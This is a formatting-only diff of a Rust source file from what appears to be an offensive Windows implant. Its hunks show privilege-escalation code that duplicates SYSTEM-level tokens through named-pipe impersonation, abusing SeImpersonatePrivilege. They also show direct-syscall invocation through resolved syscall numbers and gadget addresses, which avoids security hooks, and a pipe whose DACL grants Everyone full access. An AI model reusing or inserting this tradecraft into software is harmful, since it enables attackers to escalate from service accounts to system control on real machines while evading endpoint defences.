@@ -15,13 +15,15 @@
 //! Does NOT require Administrator privileges.  Does require
 //! `SeImpersonatePrivilege` (held by SERVICE accounts and IIS app pools).
 
-use common::lock::MutexExt;
-use anyhow::{anyhow, Context, Result};
-use std::sync::atomic::{AtomicBool, Ordering};
-use crate::win_types::SECURITY_ATTRIBUTES;
-use windows_sys::Win32::Security::{SecurityImpersonation, TOKEN_ALL_ACCESS, TOKEN_DUPLICATE, TOKEN_IMPERSONATE, TOKEN_QUERY};
 use crate::win_types::HANDLE;
+use crate::win_types::SECURITY_ATTRIBUTES;
+use anyhow::{anyhow, Context, Result};
+use common::lock::MutexExt;
+use std::sync::atomic::{AtomicBool, Ordering};
 use windows_sys::Win32::Security::TokenImpersonation;
+use windows_sys::Win32::Security::{
+    SecurityImpersonation, TOKEN_ALL_ACCESS, TOKEN_DUPLICATE, TOKEN_IMPERSONATE, TOKEN_QUERY,
+};
 // ── Constants ──────────────────────────────────────────────────────────────
 
 type DWORD = u32;
@@ -134,11 +136,7 @@ fn nt_close_handle(handle: u64) {
     let _ = crate::syscall!("NtClose", handle);
 }
 
-unsafe fn nt_open_thread_token(
-    thread: HANDLE,
-    access: u32,
-    open_as_self: bool,
-) -> Result<HANDLE> {
+unsafe fn nt_open_thread_token(thread: HANDLE, access: u32, open_as_self: bool) -> Result<HANDLE> {
     let mut token: HANDLE = std::ptr::null_mut();
     let target = crate::syscalls::get_syscall_id("NtOpenThreadToken")
         .map_err(|e| anyhow!("failed to resolve NtOpenThreadToken SSN: {e}"))?;
@@ -356,8 +354,8 @@ fn try_pipe_impersonation(trigger: &ServiceTrigger) -> Result<HANDLE> {
             target.gadget_addr,
             &[
                 &mut thread_handle as *mut _ as u64,
-                0x1FFFFF, // THREAD_ALL_ACCESS
-                0u64,     // ObjectAttributes
+                0x1FFFFF,         // THREAD_ALL_ACCESS
+                0u64,             // ObjectAttributes
                 (-1isize) as u64, // ProcessHandle (current process)
                 pipe_thread_entry as *const () as u64,
                 ctx_ptr as u64,
@@ -411,13 +409,8 @@ fn try_pipe_impersonation(trigger: &ServiceTrigger) -> Result<HANDLE> {
     };
 
     // Duplicate into an impersonation token for the main thread.
-    let dup_token = unsafe {
-        nt_duplicate_token(
-            token,
-            TOKEN_ALL_ACCESS,
-            TokenImpersonation as u32,
-        )
-    };
+    let dup_token =
+        unsafe { nt_duplicate_token(token, TOKEN_ALL_ACCESS, TokenImpersonation as u32) };
 
     // Clean up intermediate handles.
     nt_close_handle(token as u64);
@@ -447,8 +440,8 @@ fn try_pipe_impersonation_with_trigger(
 
 /// Create a named pipe with a permissive DACL that allows any user to connect.
 fn create_permissive_pipe(pipe_path: &str) -> Result<HANDLE> {
-    let path_c = std::ffi::CString::new(pipe_path)
-        .map_err(|e| anyhow!("invalid pipe path: {e}"))?;
+    let path_c =
+        std::ffi::CString::new(pipe_path).map_err(|e| anyhow!("invalid pipe path: {e}"))?;
 
     // Build a SECURITY_ATTRIBUTES with a DACL that grants Everyone GENERIC_ALL.
     let sa = build_permissive_sa();
@@ -493,8 +486,8 @@ fn create_permissive_pipe(pipe_path: &str) -> Result<HANDLE> {
 /// Build a `SECURITY_ATTRIBUTES` structure with a DACL granting Everyone
 /// full access to the named pipe.
 fn build_permissive_sa() -> SECURITY_ATTRIBUTES {
-    use windows_sys::Win32::Security::SECURITY_DESCRIPTOR;
     use windows_sys::Win32::Security::ACL;
+    use windows_sys::Win32::Security::SECURITY_DESCRIPTOR;
     // Allocate the security descriptor and ACL on the heap so they outlive
     // this function call (SECURITY_ATTRIBUTES points to them).
     //
@@ -525,8 +518,7 @@ fn build_permissive_sa() -> SECURITY_ATTRIBUTES {
     }
 
     // Initialize the ACL.
-    type InitializeAclFn =
-        unsafe extern "system" fn(*mut ACL, DWORD, DWORD) -> i32;
+    type InitializeAclFn = unsafe extern "system" fn(*mut ACL, DWORD, DWORD) -> i32;
     let init_acl_fn: Option<InitializeAclFn> =
         unsafe { resolve_fn(b"advapi32.dll\0", b"InitializeAcl\0") };
 
